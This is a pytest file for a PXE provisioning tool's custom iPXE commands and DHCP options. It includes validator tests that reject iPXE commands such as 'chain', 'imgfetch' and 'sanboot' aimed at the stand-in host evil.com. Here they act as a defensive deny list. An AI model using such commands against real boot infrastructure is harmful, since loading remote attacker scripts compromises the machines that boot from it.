"""Tests for custom iPXE scripting and DHCP options (issue #41)."""

from __future__ import annotations

import textwrap
from pathlib import Path
from unittest.mock import MagicMock

import pytest

from pxeos.config import PxeOSConfig, load_profile
from pxeos.engine import (
    ProvisioningEngine,
    _substitute_ipxe_vars,
    _validate_ipxe_command,
)
from pxeos.matcher import HostMatcher
from pxeos.models import (
    BootAssets,
    BootFirmware,
    HostRule,
    ProvisionProfile,
)
from pxeos.registry import PluginRegistry


# -- Helpers --


def _rule(**kwargs) -> HostRule:
    kwargs.setdefault("profile", "test-server")
    kwargs.setdefault("os_family", "fedora")
    kwargs.setdefault("os_version", "40")
    return HostRule(**kwargs)


def _config(tmp_path=None) -> PxeOSConfig:
    return PxeOSConfig(
        data_dir=tmp_path or Path("/tmp/pxeos-test"),
        server_host="0.0.0.0",
        server_port=8443,
    )


def _boot_assets(**kwargs) -> BootAssets:
    kwargs.setdefault("kernel", "/images/fedora/40/vmlinuz")
    kwargs.setdefault("initrd", "/images/fedora/40/initrd.img")
    kwargs.setdefault("boot_args", ("ip=dhcp",))
    return BootAssets(**kwargs)


def _build_engine(
    matcher_return=None,
    plugin=None,
    config=None,
):
    mock_matcher = MagicMock(spec=HostMatcher)
    mock_matcher.match.return_value = matcher_return

    mock_registry = MagicMock(spec=PluginRegistry)
    if plugin is not None:
        mock_registry.get.return_value = plugin

    cfg = config or _config()
    engine = ProvisioningEngine(mock_registry, mock_matcher, cfg)
    return engine, mock_matcher, mock_registry


# -- ProvisionProfile model tests --


class TestProvisionProfileIpxeFields:

    def test_default_ipxe_commands_empty(self):
        p = ProvisionProfile(
            name="test", os_family="fedora", os_version="40"
        )
        assert p.ipxe_commands == []

    def test_default_dhcp_options_empty(self):
        p = ProvisionProfile(
            name="test", os_family="fedora", os_version="40"
        )
        assert p.dhcp_options == {}

    def test_ipxe_commands_stored(self):
        p = ProvisionProfile(
            name="test",
            os_family="fedora",
            os_version="40",
            ipxe_commands=["echo Hello", "sleep 2"],
        )
        assert p.ipxe_commands == ["echo Hello", "sleep 2"]

    def test_dhcp_options_stored(self):
        p = ProvisionProfile(
            name="test",
            os_family="fedora",
            os_version="40",
            dhcp_options={"209": "pxelinux.cfg/default"},
        )
        assert p.dhcp_options == {"209": "pxelinux.cfg/default"}


# -- Variable substitution tests --


class TestSubstituteIpxeVars:

    def test_replaces_known_variables(self):
        result = _substitute_ipxe_vars(
            "echo #{mac} #{profile}",
            {"mac": "aa:bb:cc:dd:ee:ff", "profile": "myprof"},
        )
        assert result == "echo aa:bb:cc:dd:ee:ff myprof"

    def test_leaves_unknown_variables(self):
        result = _substitute_ipxe_vars(
            "echo #{unknown_var}",
            {"mac": "aa:bb:cc:dd:ee:ff"},
        )
        assert result == "echo #{unknown_var}"

    def test_replaces_hostname(self):
        result = _substitute_ipxe_vars(
            "set hostname #{hostname}",
            {"hostname": "web-01.example.com"},
        )
        assert result == "set hostname web-01.example.com"

    def test_replaces_os_family_and_version(self):
        result = _substitute_ipxe_vars(
            "echo #{os_family} #{os_version}",
            {"os_family": "fedora", "os_version": "40"},
        )
        assert result == "echo fedora 40"

    def test_replaces_arch_and_vendor(self):
        result = _substitute_ipxe_vars(
            "echo #{arch} #{vendor}",
            {"arch": "x86_64", "vendor": "rocky"},
        )
        assert result == "echo x86_64 rocky"

    def test_no_substitution_when_no_placeholders(self):
        result = _substitute_ipxe_vars(
            "echo plain text",
            {"mac": "aa:bb:cc:dd:ee:ff"},
        )
        assert result == "echo plain text"

    def test_multiple_occurrences_of_same_var(self):
        result = _substitute_ipxe_vars(
            "#{mac} and #{mac}",
            {"mac": "aa:bb:cc:dd:ee:ff"},
        )
        assert result == "aa:bb:cc:dd:ee:ff and aa:bb:cc:dd:ee:ff"

    def test_empty_variables_dict(self):
        result = _substitute_ipxe_vars("echo #{mac}", {})
        assert result == "echo #{mac}"


# -- iPXE command validation tests --


class TestValidateIpxeCommand:

    def test_allows_echo(self):
        assert _validate_ipxe_command("echo Hello") is True

    def test_allows_sleep(self):
        assert _validate_ipxe_command("sleep 5") is True

    def test_allows_set(self):
        assert _validate_ipxe_command("set net0/ip 10.0.0.1") is True

    def test_allows_dhcp(self):
        assert _validate_ipxe_command("dhcp") is True

    def test_allows_ifopen(self):
        assert _validate_ipxe_command("ifopen net0") is True

    def test_rejects_chain(self):
        assert _validate_ipxe_command("chain http://evil.com/script.ipxe") is False

    def test_rejects_imgfetch(self):
        assert _validate_ipxe_command("imgfetch http://evil.com/img") is False

    def test_rejects_imgexec(self):
        assert _validate_ipxe_command("imgexec http://evil.com/img") is False

    def test_rejects_exit(self):
        assert _validate_ipxe_command("exit") is False

    def test_rejects_shell(self):
        assert _validate_ipxe_command("shell") is False

    def test_rejects_sanboot(self):
        assert _validate_ipxe_command("sanboot http://evil.com/iscsi") is False

    def test_rejects_shebang(self):
        assert _validate_ipxe_command("#!ipxe") is False

    def test_rejects_chain_case_insensitive(self):
        assert _validate_ipxe_command("CHAIN http://evil.com/script") is False


# -- iPXE script rendering with custom commands --


class TestRenderIpxeScriptWithCustomCommands:

    def _profile_with_ipxe(
        self,
        ipxe_commands=None,
        dhcp_options=None,
    ):
        return ProvisionProfile(
            name="test-server",
            os_family="fedora",
            os_version="40",
            arch="x86_64",
            ipxe_commands=ipxe_commands or [],
            dhcp_options=dhcp_options or {},
        )

    def _make_engine(self, profile):
        rule = _rule()
        assets = _boot_assets()
        plugin = MagicMock()
        plugin.validate_profile.return_value = []
        plugin.boot_assets.return_value = assets
        plugin.supports_live = False

        engine, _, _ = _build_engine(
            matcher_return=rule, plugin=plugin
        )
        # Patch profile loading to return our profile
        engine._load_profile_for_rule = MagicMock(
            return_value=profile
        )
        return engine

    def test_ipxe_commands_injected_before_boot(self):
        profile = self._profile_with_ipxe(
            ipxe_commands=["echo Starting provisioning"]
        )
        engine = self._make_engine(profile)
        script = engine.render_ipxe_script(mac="aa:bb:cc:dd:ee:ff")
        lines = script.split("\n")

        # boot line is after the custom command
        echo_idx = next(
            i for i, l in enumerate(lines)
            if "echo Starting provisioning" in l
        )
        boot_idx = next(
            i for i, l in enumerate(lines)
            if l == "boot"
        )
        assert echo_idx < boot_idx

    def test_multiple_ipxe_commands(self):
        profile = self._profile_with_ipxe(
            ipxe_commands=["echo Step 1", "sleep 2", "echo Step 2"]
        )
        engine = self._make_engine(profile)
        script = engine.render_ipxe_script(mac="aa:bb:cc:dd:ee:ff")

        assert "echo Step 1" in script
        assert "sleep 2" in script
        assert "echo Step 2" in script

    def test_variable_substitution_in_commands(self):
        profile = self._profile_with_ipxe(
            ipxe_commands=["echo Provisioning #{mac} as #{profile}"]
        )
        engine = self._make_engine(profile)
        script = engine.render_ipxe_script(mac="aa:bb:cc:dd:ee:ff")

        assert "echo Provisioning aa:bb:cc:dd:ee:ff as test-server" in script

    def test_unsafe_commands_are_skipped(self):
        profile = self._profile_with_ipxe(
            ipxe_commands=[
                "echo safe command",
                "chain http://evil.com/script",
                "echo another safe command",
            ]
        )
        engine = self._make_engine(profile)
        script = engine.render_ipxe_script(mac="aa:bb:cc:dd:ee:ff")

        assert "echo safe command" in script
        assert "echo another safe command" in script
        assert "chain" not in script

    def test_dhcp_options_appear_as_set_commands(self):
        profile = self._profile_with_ipxe(
            dhcp_options={"net0/209": "pxelinux.cfg/default"}
        )
        engine = self._make_engine(profile)
        script = engine.render_ipxe_script(mac="aa:bb:cc:dd:ee:ff")

        assert "set net0/209 pxelinux.cfg/default" in script

    def test_multiple_dhcp_options(self):
        profile = self._profile_with_ipxe(
            dhcp_options={
                "net0/209": "pxelinux.cfg/default",
                "net0/210": "http://tftp.example.com/",
            }
        )
        engine = self._make_engine(profile)
        script = engine.render_ipxe_script(mac="aa:bb:cc:dd:ee:ff")

        assert "set net0/209 pxelinux.cfg/default" in script
        assert "set net0/210 http://tftp.example.com/" in script

    def test_dhcp_options_before_kernel_line(self):
        profile = self._profile_with_ipxe(
            dhcp_options={"net0/209": "cfg"}
        )
        engine = self._make_engine(profile)
        script = engine.render_ipxe_script(mac="aa:bb:cc:dd:ee:ff")

        lines = script.split("\n")
        set_idx = next(
            i for i, l in enumerate(lines) if l.startswith("set ")
        )
        kernel_idx = next(
            i for i, l in enumerate(lines) if l.startswith("kernel ")
        )
        assert set_idx < kernel_idx

    def test_no_custom_commands_produces_normal_script(self):
        profile = self._profile_with_ipxe()
        engine = self._make_engine(profile)
        script = engine.render_ipxe_script(mac="aa:bb:cc:dd:ee:ff")

        assert script.startswith("#!ipxe")
        assert "kernel" in script
        assert "boot" in script

    def test_hostname_var_uses_network_hostname(self):
        profile = self._profile_with_ipxe(
            ipxe_commands=["echo #{hostname}"]
        )
        profile.network = {"hostname": "web-01.example.com"}
        engine = self._make_engine(profile)
        script = engine.render_ipxe_script(mac="aa:bb:cc:dd:ee:ff")

        assert "echo web-01.example.com" in script


# -- Config parsing tests --


class TestConfigParseIpxeFields:

    def test_loads_ipxe_commands_from_toml(self, tmp_path):
        toml_file = tmp_path / "profile.toml"
        toml_file.write_text(textwrap.dedent("""\
            [profile]
            name = "ipxe-test"
            os_family = "fedora"
            os_version = "40"
            ipxe_commands = ["echo Hello", "sleep 2"]
        """))
        profile = load_profile(toml_file)
        assert profile.ipxe_commands == ["echo Hello", "sleep 2"]

    def test_loads_dhcp_options_from_toml(self, tmp_path):
        toml_file = tmp_path / "profile.toml"
        toml_file.write_text(textwrap.dedent("""\
            [profile]
            name = "dhcp-test"
            os_family = "fedora"
            os_version = "40"

            [profile.dhcp_options]
            "209" = "pxelinux.cfg/default"
            "210" = "http://tftp.example.com/"
        """))
        profile = load_profile(toml_file)
        assert profile.dhcp_options == {
            "209": "pxelinux.cfg/default",
            "210": "http://tftp.example.com/",
        }

    def test_defaults_when_not_present(self, tmp_path):
        toml_file = tmp_path / "profile.toml"
        toml_file.write_text(textwrap.dedent("""\
            [profile]
            name = "basic"
            os_family = "fedora"
            os_version = "40"
        """))
        profile = load_profile(toml_file)
        assert profile.ipxe_commands == []
        assert profile.dhcp_options == {}

    def test_both_fields_together(self, tmp_path):
        toml_file = tmp_path / "profile.toml"
        toml_file.write_text(textwrap.dedent("""\
            [profile]
            name = "combined"
            os_family = "fedora"
            os_version = "40"
            ipxe_commands = ["echo Booting #{profile}"]

            [profile.dhcp_options]
            "net0/209" = "default"
        """))
        profile = load_profile(toml_file)
        assert len(profile.ipxe_commands) == 1
        assert profile.dhcp_options == {"net0/209": "default"}
